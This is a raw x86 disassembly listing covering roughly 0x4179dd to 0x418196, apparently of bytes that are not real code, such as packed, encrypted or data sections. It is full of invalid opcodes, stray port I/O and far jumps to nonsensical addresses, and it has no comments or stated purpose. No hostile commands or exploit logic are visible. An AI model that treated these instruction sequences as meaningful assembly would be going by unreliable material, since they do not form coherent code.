  4179dd:	add    eax,DWORD PTR [edi+ecx*2+0x73]
  4179e1:	icebp  
  4179e2:	sahf   
  4179e3:	inc    ecx
  4179e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179e5:	jmp    0xde01f960
  4179ea:	and    ah,0x80
  4179ed:	adc    DWORD PTR [ecx-0x2a],esi
  4179f0:	xor    eax,0x8717e770
  4179f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f6:	xchg   BYTE PTR [ecx+0x3a],bl
  4179f9:	ss sub al,0x4
  4179fc:	call   0x4459f2
  417a01:	jo     0x417a32
  417a03:	cld    
  417a04:	lds    esp,FWORD PTR [edi+0x54ea4c0e]
  417a0a:	stc    
  417a0b:	(bad)  
  417a0c:	out    dx,eax
  417a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a0e:	ja     0x417a8f
  417a10:	sub    eax,DWORD PTR [esi]
  417a12:	inc    esi
  417a13:	dec    ebp
  417a14:	cmp    DWORD PTR [edx+ebp*1+0x1],0x4d9a6c0d
  417a1c:	std    
  417a1d:	out    dx,al
  417a1e:	cmp    al,0xc4
  417a20:	pop    ss
  417a21:	jmp    0xdf3e5547
  417a26:	daa    
  417a27:	mov    dl,0xe7
  417a29:	imul   eax,DWORD PTR [eax],0x0
  417a2c:	add    BYTE PTR [eax],al
  417a2e:	add    BYTE PTR [eax+0x493afd4d],al
  417a34:	into   
  417a35:	cmp    esi,eax
  417a37:	inc    edi
  417a38:	pop    edx
  417a39:	std    
  417a3a:	pshufw mm0,QWORD PTR [edx],0x87
  417a3e:	das    
  417a3f:	mov    ecx,0x4811ff9b
  417a44:	inc    eax
  417a45:	or     al,0xe9
  417a47:	mov    ebp,0x126aec7a
  417a4c:	dec    edx
  417a4d:	add    DWORD PTR [ebp-0xabc85be],0x54b523
  417a57:	sti    
  417a58:	out    dx,al
  417a59:	xchg   BYTE PTR [ebp+0x3c],al
  417a5c:	mov    al,0x2f
  417a5e:	mov    esp,DWORD PTR [ecx+0x5475fb02]
  417a64:	test   bh,al
  417a66:	inc    edi
  417a68:	mov    esi,0x42707488
  417a6d:	xchg   BYTE PTR [eax+eax*4+0x26],bl
  417a71:	call   0xfaf234e2
  417a76:	test   BYTE PTR [eax+eax*1-0x7c],cl
  417a7a:	push   ds
  417a7b:	push   cs
  417a7c:	(bad)  
  417a7d:	dec    DWORD PTR [edx+0x62e546e1]
  417a83:	inc    ecx
  417a84:	mov    al,0xfa
  417a86:	mov    al,dl
  417a88:	and    cl,BYTE PTR [ebx]
  417a8a:	mov    edx,DWORD PTR [edx-0x71]
  417a8d:	in     eax,0xa6
  417a8f:	mov    ds:0x89fab0,al
  417a94:	add    BYTE PTR [eax],al
  417a96:	add    BYTE PTR [eax],al
  417a98:	adc    BYTE PTR [ebx],ah
  417a9a:	sbb    BYTE PTR [eax+0x681232cd],ch
  417aa0:	hlt    
  417aa1:	pop    ds
  417aa2:	add    BYTE PTR [eax],al
  417aa4:	retf   
  417aa5:	push   edx
  417aa6:	adc    DWORD PTR [edx],0x647eff1c
  417aac:	jo     0x417af8
  417aae:	std    
  417aaf:	call   0x41795d
  417ab4:	hlt    
  417ab5:	add    ecx,DWORD PTR [ebx]
  417ab7:	test   BYTE PTR [esi],bl
  417ab9:	(bad)  
  417aba:	(bad)  
  417abb:	dec    DWORD PTR [edi]
  417abd:	pop    edx
  417abe:	and    DWORD PTR [eax],edx
  417ac0:	mov    ebp,?
  417ac2:	cmc    
  417ac3:	inc    esi
  417ac4:	loop   0x417aff
  417ac6:	and    DWORD PTR [esi],ecx
  417ac8:	popf   
  417ac9:	div    DWORD PTR [ebx+0x24]
  417acc:	pop    eax
  417acd:	xor    eax,DWORD PTR [edi-0x75]
  417ad0:	dec    eax
  417ad1:	sbb    bh,BYTE PTR [eax-0x7d]
  417ad4:	jne    0x417ac8
  417ad6:	pop    es
  417ad7:	add    cl,ah
  417ad9:	sbb    edi,DWORD PTR [ebp+0x44]
  417adc:	cdq    
  417add:	sbb    edi,DWORD PTR [ebp+0x7c]
  417ae0:	xchg   ecx,eax
  417ae1:	aas    
  417ae2:	pop    ecx
  417ae3:	(bad)  
  417ae4:	sub    cl,dl
  417ae6:	dec    esi
  417ae7:	test   BYTE PTR ds:0xb98b1750,dh
  417aed:	not    DWORD PTR [ebx]
  417aef:	push   eax
  417af0:	dec    ebp
  417af1:	fadd   st(5),st
  417af3:	cld    
  417af4:	xor    dh,BYTE PTR [ecx-0x3ca2dc29]
  417afa:	mov    WORD PTR [edi],?
  417afc:	add    BYTE PTR [eax],al
  417afe:	add    BYTE PTR [eax],al
  417b00:	add    BYTE PTR [edx],ah
  417b02:	ror    DWORD PTR [esi+0x74],0x51
  417b06:	dec    ebx
  417b07:	push   eax
  417b08:	adc    eax,DWORD PTR [ecx-0x3ed4]
  417b0e:	lahf   
  417b0f:	and    eax,0x2597ec2c
  417b14:	adc    al,dh
  417b16:	sbb    ebx,eax
  417b18:	or     bh,ah
  417b1a:	addr16 and eax,0x817fde14
  417b20:	jl     0x417abb
  417b22:	push   eax
  417b23:	add    DWORD PTR [ebx+0x72],esi
  417b26:	and    eax,ecx
  417b28:	and    eax,DWORD PTR [ebx+0x5f565c5b]
  417b2e:	cmp    bh,BYTE PTR [esi+0x7c]
  417b31:	cdq    
  417b32:	rep stos DWORD PTR es:[edi],eax
  417b34:	out    0x57,eax
  417b36:	add    al,BYTE PTR [ecx]
  417b38:	add    dh,bh
  417b3a:	out    0x6f,al
  417b3c:	adc    esi,DWORD PTR ds:0xa2ffd95b
  417b42:	pop    ebx
  417b43:	mov    eax,ds:0xb1a0ee51
  417b48:	cld    
  417b49:	or     BYTE PTR [ebx+0x50],ah
  417b4c:	(bad)  
  417b4d:	pop    ds
  417b4e:	(bad)  
  417b4f:	jl     0x417bcd
  417b51:	pop    ecx
  417b52:	add    al,bh
  417b54:	stos   DWORD PTR es:[edi],eax
  417b55:	xchg   edx,eax
  417b56:	(bad)  
  417b57:	inc    DWORD PTR [edx]
  417b59:	jne    0x417ae8
  417b5b:	out    0x3,eax
  417b5d:	jne    0x417ae1
  417b5f:	cmp    bl,dh
  417b61:	popa   
  417b62:	jge    0x417b12
  417b64:	mov    bl,0x0
  417b66:	add    BYTE PTR [eax],al
  417b68:	add    BYTE PTR [eax],al
  417b6a:	pop    ecx
  417b6b:	iret   
  417b6c:	out    dx,al
  417b6d:	push   eax
  417b6e:	sub    ebx,esp
  417b70:	int3   
  417b71:	jle    0x417b3c
  417b73:	push   ds
  417b74:	mov    edi,0x205aab
  417b79:	add    esi,DWORD PTR [ebp-0x4b]
  417b7c:	rcl    BYTE PTR [eax-0x4],1
  417b7f:	inc    eax
  417b80:	mov    bh,0x50
  417b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b83:	cli    
  417b84:	dec    ebp
  417b85:	cmp    esp,esi
  417b87:	cmp    al,0x46
  417b89:	nop
  417b8a:	popa   
  417b8b:	aaa    
  417b8c:	stos   BYTE PTR es:[edi],al
  417b8d:	add    ebp,DWORD PTR [eax+0x65f7dc49]
  417b93:	ret    0x83e6
  417b96:	sbb    DWORD PTR [esi],0x7e6803f5
  417b9c:	push   0x62027503
  417ba1:	(bad)  
  417ba2:	jb     0x417bfe
  417ba4:	lock push edx
  417ba6:	loopne 0x417bf0
  417ba8:	ret    0x6644
  417bab:	cld    
  417bac:	xchg   esp,eax
  417bad:	pop    ebx
  417bae:	xchg   BYTE PTR [ebx-0xa],dl
  417bb1:	dec    edi
  417bb2:	mov    WORD PTR [ebp+0x73],es
  417bb5:	fsub   st(5),st
  417bb7:	push   ecx
  417bb8:	mov    al,al
  417bba:	scas   eax,DWORD PTR es:[edi]
  417bbb:	(bad)  
  417bbc:	out    0xda,al
  417bbe:	test   al,0x19
  417bc0:	(bad)  
  417bc1:	fcomp  DWORD PTR [edx-0xe]
  417bc4:	popa   
  417bc5:	enter  0xee52,0xce
  417bc9:	jne    0x417b92
  417bcb:	dec    eax
  417bcc:	mov    esi,0xa5
  417bd1:	add    BYTE PTR [eax],al
  417bd3:	inc    ecx
  417bd4:	aaa    
  417bd5:	add    BYTE PTR [edx],ch
  417bd7:	jno    0x417c20
  417bd9:	je     0x417bc2
  417bdb:	mov    fs,WORD PTR [eax-0x17]
  417bde:	loope  0x417c0b
  417be0:	inc    edi
  417be1:	lahf   
  417be2:	sub    eax,0x69ffc1b4
  417be7:	pop    ebp
  417be8:	(bad)  
  417be9:	pop    ss
  417bea:	jmp    0x2b0c3308
  417bef:	jno    0x417b72
  417bf1:	fs out 0x96,eax
  417bf4:	add    bl,BYTE PTR [edi-0x3e4bdb]
  417bfa:	pop    edi
  417bfb:	add    eax,0x35881bfe
  417c00:	cmp    eax,0xb6afe941
  417c05:	and    edx,ecx
  417c07:	test   eax,0xd9f905b6
  417c0c:	mov    dh,0xca
  417c0e:	stos   BYTE PTR es:[edi],al
  417c0f:	jbe    0x417c8a
  417c11:	dec    esp
  417c12:	add    eax,0xef4c8125
  417c17:	add    ch,BYTE PTR [ecx+0x4c]
  417c1a:	sbb    al,0x36
  417c1c:	dec    eax
  417c1d:	mov    dh,BYTE PTR [ebp-0x52790dae]
  417c23:	js     0x417c43
  417c25:	jmp    0x240fb7f3
  417c2a:	xchg   ecx,eax
  417c2b:	pop    edi
  417c2c:	jle    0x417c52
  417c2e:	imul   esi,DWORD PTR [ecx+0x2],0x34941100
  417c35:	std    
  417c36:	test   BYTE PTR [eax],0x0
  417c39:	add    BYTE PTR [eax],al
  417c3b:	add    bh,dh
  417c3d:	(bad)  
  417c3e:	and    ebx,ecx
  417c40:	jbe    0x417c10
  417c42:	push   es
  417c43:	out    0xa2,al
  417c45:	and    edx,DWORD PTR [eax]
  417c47:	sar    edx,1
  417c49:	mov    al,ds:0x46e3e900
  417c4e:	adc    esi,ecx
  417c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c51:	pop    es
  417c52:	add    BYTE PTR [eax],al
  417c54:	(bad)  
  417c55:	cli    
  417c56:	mov    edx,0xfd44e134
  417c5b:	cmc    
  417c5c:	pop    eax
  417c5d:	sbb    bl,BYTE PTR [eax]
  417c5f:	add    al,0x48
  417c61:	(bad)
  417c65:	pop    edi
  417c66:	mov    BYTE PTR [ebp+0x6c],cl
  417c69:	(bad)  
  417c6a:	cld    
  417c6b:	mov    bl,BYTE PTR [eax-0x7e7497e6]
  417c71:	dec    edx
  417c72:	push   esp
  417c73:	mov    DWORD PTR [ebp-0x48],ecx
  417c76:	adc    BYTE PTR [edi+ebp*1],dl
  417c79:	inc    ebx
  417c7a:	std    
  417c7b:	mov    cl,BYTE PTR [ecx+0x4b]
  417c7e:	in     eax,0x4a
  417c80:	mov    esp,0x8f3bfab8
  417c85:	sub    al,BYTE PTR [edi]
  417c87:	push   esi
  417c88:	les    ebx,FWORD PTR [ebp-0x13]
  417c8b:	inc    ebx
  417c8d:	cld    
  417c8e:	mov    esi,0xefcb6d74
  417c93:	mov    eax,ds:0x3ec1e0
  417c98:	daa    
  417c99:	lods   eax,DWORD PTR ds:[esi]
  417c9a:	daa    
  417c9b:	dec    eax
  417c9d:	cld    
  417c9e:	or     ebp,eax
  417ca0:	add    BYTE PTR [eax],al
  417ca2:	add    BYTE PTR [eax],al
  417ca4:	add    BYTE PTR [edx],al
  417ca6:	sti    
  417ca7:	cli    
  417ca8:	inc    DWORD PTR [edi+0x6764213f]
  417cae:	add    cl,BYTE PTR [ebp+ecx*8+0x1f]
  417cb2:	add    eax,DWORD PTR [ebp+0x5446c244]
  417cb8:	(bad)  
  417cb9:	mov    ecx,0xdc40105a
  417cbe:	add    DWORD PTR [esp+0x1c],0xd3d145ab
  417cc6:	mov    ah,0x86
  417cc8:	inc    esp
  417cc9:	push   0x375e5c4a
  417cce:	leave  
  417ccf:	loopne 0x417d2e
  417cd1:	jne    0x417c6e
  417cd3:	hlt    
  417cd4:	dec    DWORD PTR [ecx-0x1c]
  417cd7:	pop    edi
  417cd8:	call   0x42a58f
  417cdd:	stc    
  417cde:	cwde   
  417cdf:	fdivr  DWORD PTR [edi]
  417ce1:	and    ecx,DWORD PTR [ebx+edx*2+0x37]
  417ce5:	or     BYTE PTR [ecx],ch
  417ce7:	aad    0x1c
  417ce9:	cmp    al,0xe6
  417ceb:	push   DWORD PTR [ebx-0x71]
  417cee:	repz add eax,DWORD PTR [eax]
  417cf1:	jne    0x417cae
  417cf3:	dec    edx
  417cf4:	jae    0x417c7b
  417cf6:	je     0x417ccd
  417cf8:	or     ebx,DWORD PTR [edx+0x47]
  417cfb:	stc    
  417cfc:	cld    
  417cfd:	push   0x753ff4f3
  417d02:	loop   0x417cd8
  417d04:	paddsb mm1,QWORD PTR [esi-0x3]
  417d08:	mov    al,BYTE PTR [eax]
  417d0a:	add    BYTE PTR [eax],al
  417d0c:	add    BYTE PTR [eax],al
  417d0e:	mov    al,0x3
  417d10:	mov    ah,0x8a
  417d12:	mov    eax,0x2a55b14f
  417d17:	daa    
  417d18:	stc    
  417d19:	xor    BYTE PTR [esp+eax*8],ch
  417d1c:	mov    bl,0xfa
  417d1e:	sbb    bh,BYTE PTR [ebp+0x50d80ad]
  417d24:	aad    0x4
  417d26:	test   al,0xc
  417d28:	and    eax,0x19b6874
  417d2d:	pop    ebx
  417d2e:	aaa    
  417d2f:	dec    eax
  417d30:	add    DWORD PTR [ebx-0x2],edx
  417d33:	neg    DWORD PTR [ebx+0x70]
  417d36:	test   DWORD PTR [ebx+0x1],ebx
  417d39:	test   BYTE PTR [ebp-0x59aa3e91],dh
  417d3f:	inc    ebp
  417d40:	or     dh,BYTE PTR [ebx+0x65]
  417d43:	iret   
  417d44:	jmp    0x417d7c
  417d46:	inc    eax
  417d47:	pop    edi
  417d48:	aad    0x19
  417d4a:	dec    ebp
  417d4b:	pop    ebx
  417d4c:	add    DWORD PTR [eax],eax
  417d4e:	adc    eax,0x82d6e603
  417d53:	inc    ebp
  417d54:	push   esp
  417d55:	add    BYTE PTR [eax-0x79b32131],ch
  417d5b:	data16 hlt 
  417d5d:	ret    
  417d5e:	call   0xeacf:0xfbf43c7a
  417d65:	jle    0x417d9d
  417d67:	jmp    0xb616:0xee367f16
  417d6e:	jns    0x417d3f
  417d70:	out    dx,al
  417d71:	adc    BYTE PTR [eax],al
  417d73:	add    BYTE PTR [eax],al
  417d75:	add    BYTE PTR [eax],al
  417d77:	cmp    bl,BYTE PTR [edx-0x60]
  417d7a:	dec    edi
  417d7b:	push   0x5d813545
  417d80:	inc    ebp
  417d81:	adc    al,0x5
  417d83:	mov    esi,0x666bcc45
  417d88:	ret    0xaee6
  417d8b:	xor    al,0xee
  417d8d:	out    0xb6,al
  417d8f:	in     eax,dx
  417d90:	push   ebp
  417d91:	push   0x67
  417d93:	cmp    eax,0xcb1f5381
  417d98:	pop    edx
  417d99:	stc    
  417d9a:	repz sub al,BYTE PTR [ebp+0x6b]
  417d9e:	inc    ebx
  417d9f:	test   eax,0x8f5619cf
  417da4:	sbb    dh,BYTE PTR [edi+eax*8+0x56]
  417da8:	idiv   bh
  417daa:	(bad)  
  417dab:	jle    0x417d7c
  417dad:	(bad)  [ebp-0x3c2bba4e]
  417db3:	pusha  
  417db4:	ret    0x80e6
  417db7:	mov    ecx,0x96c725f5
  417dbc:	cli    
  417dbd:	mov    esi,0x2027503
  417dc2:	adc    al,bl
  417dc4:	into   
  417dc5:	repnz mov bl,0xda
  417dc8:	mov    al,0xb5
  417dca:	dec    esp
  417dcb:	enter  0xa,0x7d
  417dcf:	call   0x23ce:0x6fc573ee
  417dd6:	stc    
  417dd7:	ret    0x67e6
  417dda:	jmp    0x417ddf
  417ddf:	add    BYTE PTR [esi+0x2],dh
  417de2:	mov    al,ds:0x1820c5d6
  417de7:	into   
  417de8:	lds    esp,FWORD PTR [eax]
  417dea:	sbb    dh,al
  417dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ded:	cld    
  417dee:	cld    
  417def:	aam    0xae
  417df1:	out    dx,eax
  417df2:	aas    
  417df3:	jmp    0xd9654bf9
  417df8:	stc    
  417df9:	int    0x23
  417dfb:	std    
  417dfc:	in     eax,dx
  417dfd:	mov    esi,0x7926c923
  417e02:	inc    esp
  417e03:	int    0x96
  417e05:	mov    dl,0x55
  417e07:	mov    es,WORD PTR [esp+edi*8+0x30]
  417e0b:	mov    al,0xb1
  417e0d:	fsincos 
  417e0f:	jle    0x417dcf
  417e11:	cmp    eax,0x8ae82476
  417e17:	and    eax,0xeae8fa95
  417e1c:	mov    bl,0xbf
  417e1e:	or     ebx,DWORD PTR [esi+0x44]
  417e21:	in     al,dx
  417e22:	cld    
  417e23:	fcom   QWORD PTR [edx]
  417e25:	inc    edi
  417e26:	jae    0x417e21
  417e28:	out    0x46,al
  417e2a:	jae    0x417e1d
  417e2c:	mov    edi,0x36d487ef
  417e31:	inc    esp
  417e32:	pop    ebx
  417e33:	bound  edx,QWORD PTR [edi+eiz*4-0x50892a3f]
  417e3a:	mov    BYTE PTR ds:0x6af85efa,dl
  417e40:	dec    ebp
  417e41:	push   ss
  417e42:	push   esi
  417e43:	add    DWORD PTR [eax],eax
  417e45:	add    BYTE PTR [eax],al
  417e47:	add    BYTE PTR [eax],al
  417e49:	mov    esp,0x5ae8fff6
  417e4e:	inc    edx
  417e4f:	je     0x417e51
  417e51:	push   ecx
  417e52:	in     al,dx
  417e53:	cmc    
  417e54:	push   0xffffffa4
  417e56:	retf   0x2443
  417e59:	fdiv   st,st(6)
  417e5b:	jo     0x417e69
  417e5d:	inc    ecx
  417e5e:	push   edx
  417e5f:	push   ebx
  417e60:	push   eax
  417e61:	fwait
  417e62:	push   edx
  417e63:	cmp    eax,0x7efe5c16
  417e68:	les    ebx,FWORD PTR [eax-0x6bdbbc40]
  417e6e:	out    0xff,eax
  417e70:	call   FWORD PTR [esp+eiz*4+0x4a41ff2e]
  417e77:	dec    ebp
  417e78:	call   0x3c7077
  417e7d:	test   DWORD PTR [ebx],esi
  417e7f:	and    DWORD PTR [eax+edx*4],edx
  417e82:	and    dh,BYTE PTR ds:0x714f3074
  417e88:	push   ds
  417e89:	je     0x417e89
  417e8b:	(bad)  
  417e8c:	jmp    FWORD PTR [eax+edi*4-0x47abdb8d]
  417e93:	jae    0x417eb9
  417e95:	push   esp
  417e96:	mov    eax,0x52cb0870
  417e9b:	cdq    
  417e9c:	adc    eax,0x7484fe8c
  417ea1:	or     BYTE PTR [esi-0x7a],0x74
  417ea5:	jo     0x417ef9
  417ea7:	mov    al,BYTE PTR [eax+esi*2+0x1e]
  417eab:	push   eax
  417eac:	lea    eax,[eax]
  417eae:	add    BYTE PTR [eax],al
  417eb0:	add    BYTE PTR [eax],al
  417eb2:	shl    dl,1
  417eb4:	pop    ds
  417eb5:	push   eax
  417eb6:	repnz mov bh,0x70
  417eb9:	or     BYTE PTR [edi],cl
  417ebb:	push   es
  417ebc:	call   0xfaf9c687
  417ec1:	add    DWORD PTR [eax+edi*4+0x70],0x1c
  417ec6:	imul   eax,DWORD PTR [ebx-0x378f7df],0x5d754586
  417ed0:	dec    edx
  417ed1:	jae    0x417f50
  417ed3:	hlt    
  417ed4:	iret   
  417ed5:	adc    edx,edx
  417ed7:	(bad)
  417eda:	retf   0xf8cd
  417edd:	cld    
  417ede:	push   0x753fefdd
  417ee3:	jae    0x417f63
  417ee5:	jecxz  0x417f37
  417ee7:	xchg   edi,eax
  417ee8:	lock inc DWORD PTR [edi+0xb]
  417eec:	jnp    0x417f62
  417eee:	pop    ecx
  417eef:	pop    ebp
  417ef0:	scas   eax,DWORD PTR es:[edi]
  417ef1:	cld    
  417ef2:	or     cl,0xec
  417ef5:	aas    
  417ef6:	jne    0x417ec8
  417ef8:	sub    ebp,eax
  417efa:	mov    dh,0x52
  417efc:	add    DWORD PTR [eax],eax
  417efe:	stc    
  417eff:	cwde   
  417f00:	shl    BYTE PTR [ebx],1
  417f02:	and    dl,ah
  417f04:	bswap  ebx
  417f06:	mov    dh,0x2b
  417f08:	mov    al,0xfc
  417f0a:	xor    BYTE PTR [edi],0xf4
  417f0d:	aas    
  417f0e:	jne    0x417e93
  417f10:	sub    bl,ch
  417f12:	pop    edx
  417f13:	xchg   ecx,eax
  417f14:	cmp    eax,0x0
  417f17:	add    BYTE PTR [eax],al
  417f19:	add    BYTE PTR [eax],al
  417f1b:	push   edx
  417f1c:	inc    eax
  417f1d:	(bad)  
  417f1e:	out    0xed,eax
  417f20:	xchg   ecx,eax
  417f21:	inc    edi
  417f22:	std    
  417f23:	stos   BYTE PTR es:[edi],al
  417f24:	mov    eax,0xeb6617ec
  417f29:	add    ebx,DWORD PTR [ebp-0x2d]
  417f2c:	mov    ah,0x42
  417f2e:	pop    ecx
  417f2f:	aaa    
  417f30:	sub    BYTE PTR [ecx],al
  417f32:	push   ebx
  417f33:	out    dx,al
  417f34:	(bad)  
  417f35:	pop    ebx
  417f36:	mov    WORD PTR [ebx+0x2b],gs
  417f39:	add    DWORD PTR [ebp+esi*1+0x35311a80],eax
  417f40:	add    edi,DWORD PTR [ebp+0x90d890b]
  417f46:	inc    ebx
  417f47:	gs jns 0x417f30
  417f4a:	cmp    BYTE PTR ss:[edx],al
  417f4d:	sti    
  417f4e:	iret   
  417f4f:	adc    dl,0xb6
  417f52:	dec    eax
  417f53:	pushw  ss
  417f55:	fs mov edi,0xf3944172
  417f5b:	shl    DWORD PTR [edi+0x39325bf2],1
  417f61:	dec    BYTE PTR [eax-0xc]
  417f64:	cmp    dh,dh
  417f66:	into   
  417f67:	jno    0x417f48
  417f69:	in     eax,dx
  417f6a:	push   ds
  417f6b:	in     eax,0x17
  417f6d:	daa    
  417f6e:	add    al,0x4e
  417f70:	inc    esp
  417f71:	test   DWORD PTR [ebx],0xb1c38d46
  417f77:	xchg   edx,eax
  417f78:	int    0xdc
  417f7a:	add    esi,DWORD PTR [ebp-0x73]
  417f7d:	cmp    al,0xf8
  417f7f:	add    BYTE PTR [eax],al
  417f81:	add    BYTE PTR [eax],al
  417f83:	add    dh,dh
  417f85:	inc    edx
  417f86:	xor    ebx,DWORD PTR [ebx]
  417f88:	idiv   BYTE PTR [eax]
  417f8a:	cmp    ebx,DWORD PTR [edi]
  417f8c:	in     al,dx
  417f8d:	fcom   st(2)
  417f8f:	jle    0x417fd8
  417f91:	mov    dh,0x4
  417f93:	ja     0x417f48
  417f95:	sbb    dh,BYTE PTR [edx-0x5]
  417f98:	test   DWORD PTR [edx+0x1b],0xf2b759ef
  417f9f:	fst    QWORD PTR [ebx-0x2f]
  417fa2:	pop    ss
  417fa3:	mov    dh,0xff
  417fa5:	(bad)  
  417fa6:	out    dx,al
  417fa7:	pop    ebx
  417fa8:	jbe    0x417fe3
  417faa:	jbe    0x417ff4
  417fac:	hlt    
  417fad:	cmp    DWORD PTR [esi-0x32],ebp
  417fb0:	add    BYTE PTR [ecx-0x24],0xef
  417fb4:	sub    DWORD PTR [edi-0x48de4e0a],esi
  417fba:	fimul  WORD PTR [eax-0x7a]
  417fbd:	mov    esi,0xdf12c3f3
  417fc2:	mov    ds:0x94026545,eax
  417fc7:	jl     0x417fda
  417fc9:	sub    al,BYTE PTR [eax]
  417fcb:	aaa    
  417fcc:	add    eax,DWORD PTR [ecx-0x3]
  417fcf:	gs ss mov dh,0x16
  417fd3:	es mov ebx,0xdea48b14
  417fd9:	stos   BYTE PTR es:[edi],al
  417fda:	add    DWORD PTR [esi],edx
  417fdc:	stos   DWORD PTR es:[edi],eax
  417fdd:	or     al,0x6a
  417fdf:	jmp    0x3326c094
  417fe4:	and    al,0x3f
  417fe6:	std    
  417fe7:	push   0x0
  417fe9:	add    BYTE PTR [eax],al
  417feb:	add    BYTE PTR [eax],al
  417fed:	cs aas 
  417fef:	jae    0x417fdf
  417ff1:	adc    edi,DWORD PTR [esi]
  417ff3:	and    ebp,DWORD PTR [ecx-0x5d]
  417ff6:	add    BYTE PTR [eax],al
  417ff8:	inc    esp
  417ff9:	aaa    
  417ffa:	adc    al,BYTE PTR [eax]
  417ffc:	xor    al,0x1e
  417ffe:	cs call 0xfd821cab
  418004:	cmp    DWORD PTR gs:[esi+0x7dda1f41],esi
  41800b:	xor    al,0xac
  41800d:	mov    dh,0x40
  41800f:	push   esi
  418010:	mov    dh,0x84
  418012:	adc    al,0x11
  418014:	sub    DWORD PTR [ecx-0x77],edi
  418017:	jae    0x41800a
  418019:	into   
  41801a:	and    esp,ebp
  41801c:	sahf   
  41801d:	mov    edx,0x4596f881
  418022:	push   ds
  418023:	imul   ebp,DWORD PTR [ecx+0x35030171],0x69ffc18c
  41802d:	xor    DWORD PTR [edi+edi*8],edx
  418030:	sti    
  418031:	inc    ebx
  418032:	mov    ecx,DWORD PTR [eax-0x27]
  418035:	div    DWORD PTR [edi+0x63ae903]
  41803b:	mov    DWORD PTR [ecx-0x1ebc787e],ebp
  418041:	retf   
  418042:	ds adc esi,ecx
  418045:	pop    es
  418046:	add    BYTE PTR [eax],al
  418048:	add    bl,dl
  41804a:	gs pop edx
  41804c:	(bad)  
  41804d:	jns    0x417fe1
  41804f:	adc    DWORD PTR [eax+0x0],eax
  418052:	add    BYTE PTR [eax],al
  418054:	add    BYTE PTR [eax],al
  418056:	or     al,0xdc
  418058:	jnp    0x418067
  41805a:	fadd   QWORD PTR [ebx]
  41805c:	test   al,al
  41805e:	or     BYTE PTR [edi],bh
  418060:	mov    BYTE PTR [eax+edi*4+0x3b],cl
  418064:	in     eax,0xb4
  418066:	jb     0x41802f
  418068:	cli    
  418069:	(bad)  
  41806a:	mov    ecx,0xdc401257
  41806f:	(bad)  [ebx+0xd]
  418072:	int3   
  418073:	add    eax,DWORD PTR [eax+eax*8+0x4c883e38]
  41807a:	mov    eax,0xc29ce53b
  41807f:	enter  0xfffa,0x79
  418083:	adc    BYTE PTR [ecx],0x40
  418086:	mov    WORD PTR [edx-0x78],?
  418089:	in     al,dx
  41808a:	pop    ds
  41808b:	dec    edx
  41808c:	or     DWORD PTR [ecx],eax
  41808e:	dec    ecx
  41808f:	das    
  418090:	cmp    BYTE PTR [ebp-0x58],0x3f
  418094:	jb     0x4180a7
  418096:	mov    ah,0xa
  418098:	or     DWORD PTR [eax],eax
  41809a:	pop    esp
  41809b:	mov    edi,0xbc6474bf
  4180a0:	dec    eax
  4180a1:	adc    BYTE PTR [ecx*2+0x6a03ffeb],al
  4180a8:	cld    
  4180a9:	and    eax,0x3d3164
  4180ae:	imul   edi,DWORD PTR [ebx+0x3a998beb],0x650ec7e
  4180b8:	add    BYTE PTR [eax],al
  4180ba:	add    BYTE PTR [eax],al
  4180bc:	add    BYTE PTR [eax],al
  4180be:	add    BYTE PTR [edx+0x1c020088],cl
  4180c4:	add    edx,DWORD PTR [ebx+0x39]
  4180c7:	jl     0x41811d
  4180c9:	jbe    0x418121
  4180cb:	jne    0x4180a5
  4180cd:	iret   
  4180ce:	pop    es
  4180cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180d0:	ror    ebx,0x33
  4180d3:	or     cl,al
  4180d5:	cmp    DWORD PTR [ebx+0x65],0xfa23cd29
  4180dc:	jge    0x4180cf
  4180de:	sbb    BYTE PTR [eax],0xf5
  4180e1:	inc    edx
  4180e2:	std    
  4180e3:	jmp    0x461e:0xe9837828
  4180ea:	std    
  4180eb:	int    0x52
  4180ed:	and    al,0xff
  4180ef:	shl    BYTE PTR [ebx-0x4a4176d6],cl
  4180f5:	jg     0x4180eb
  4180f7:	ret    
  4180f8:	aas    
  4180f9:	inc    ebx
  4180fa:	call   0x45cc46
  4180ff:	hlt    
  418100:	jae    0x4180bf
  418102:	ds inc ebx
  418104:	out    dx,al
  418105:	int3   
  418106:	cmp    cl,BYTE PTR ds:0x75000121
  41810c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41810d:	into   
  41810e:	pop    es
  41810f:	sub    eax,ebx
  418111:	add    DWORD PTR [ebx-0x1856cef8],ecx
  418117:	in     al,0xe9
  418119:	add    BYTE PTR [eax],al
  41811b:	out    dx,al
  41811c:	in     eax,dx
  41811d:	sti    
  41811e:	cmp    BYTE PTR [esi+0x1ece27],dh
  418124:	add    BYTE PTR [eax],al
  418126:	add    BYTE PTR [eax],al
  418128:	sub    eax,0x7500019e
  41812d:	add    eax,0x3ce20609
  418132:	hlt    
  418133:	mov    ah,0x7b
  418135:	mov    al,ds:0xb2a50bb4
  41813a:	add    BYTE PTR [ebx+0x50b131b6],cl
  418140:	dec    ebp
  418141:	es or  eax,0xfc32fd
  418147:	jmp    0x445a83c3
  41814c:	rcr    ah,0x2f
  41814f:	inc    edx
  418150:	imul   eax,DWORD PTR [edx],0x842178bc
  418156:	cmp    edi,esp
  418158:	or     edi,DWORD PTR [esi]
  41815a:	out    0xad,eax
  41815c:	test   eax,0x7503357d
  418161:	add    ah,BYTE PTR [edx+0x54]
  418164:	cld    
  418165:	inc    ebp
  418166:	lds    ecx,FWORD PTR [eax]
  418168:	int    0xb4
  41816a:	jmp    0x21f4:0x8629b511
  418171:	inc    edx
  418172:	mov    bh,0x44
  418174:	inc    esi
  418175:	or     bl,BYTE PTR [esi+ebp*4+0x7c]
  418179:	ror    BYTE PTR [esi],1
  41817b:	das    
  41817c:	test   BYTE PTR ds:0xe8bad9fe,bh
  418182:	out    dx,al
  418183:	lods   al,BYTE PTR ds:[esi]
  418184:	jne    0x4181c6
  418186:	xchg   edi,eax
  418187:	pop    ebx
  418188:	inc    edx
  418189:	aas    
  41818a:	out    0x3,eax
  41818c:	add    BYTE PTR [eax],al
  41818e:	add    BYTE PTR [eax],al
  418190:	add    BYTE PTR ds:0x7503e83a,cl
  418196:	(bad)  
